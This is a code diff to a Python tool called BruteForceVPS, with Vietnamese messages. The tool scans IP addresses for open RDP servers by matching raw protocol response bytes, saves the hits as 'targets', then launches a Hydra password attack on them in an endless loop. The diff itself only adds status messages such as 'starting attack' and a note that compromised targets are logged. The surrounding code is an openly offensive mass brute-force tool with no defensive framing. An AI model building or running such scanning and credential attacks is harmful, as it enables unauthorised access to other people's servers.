@@ -5,6 +5,7 @@ import os
 
 class BruteForceVPS:
     def __init__(self, username="John", password="12345", targets_ip_path="targets.txt", hydra_output="hydra_output.txt"):
+        print(f"Lời nhắc: các mục tiêu đã tấn công thành công được lưu vào tệp {hydra_output}")
         self.username = username
         self.password = password
         self.hydra_output = hydra_output
@@ -32,7 +33,7 @@ class BruteForceVPS:
                 filter_rdp_non_verify = [b"\x03\x00\x00\x13\x0e\xd0\x00\x00\x124\x00\x02\x1f\x08\x00\x02\x00\x00\x00",
                                         b"\x03\x00\x00\x13\x0e\xd0\x00\x00\x124\x00\x02\x0f\x08\x00\x02\x00\x00\x00"]
                 if response in filter_rdp_non_verify:
-                    print(f"đã tìm thấy {ip}")
+                    print(f"đã tìm thấy mục tiêu {ip}")
                     with open(self.targets_ip_path, "a", encoding="utf-8") as file:
                         file.write(f"{ip}\n")
         except:
@@ -55,7 +56,9 @@ class BruteForceVPS:
         while True:
             if os.path.exists(self.targets_ip_path) == True:
                 os.remove(self.targets_ip_path)
+            print("bắt đầu tìm kiếm mục tiêu")
             self.multi_thread_scan(thread_num=num_thread)
+            print("bắt đầu tấn công")
             self.hydra_attack()
 
 num_thread = int(input("nhập số luồng : "))
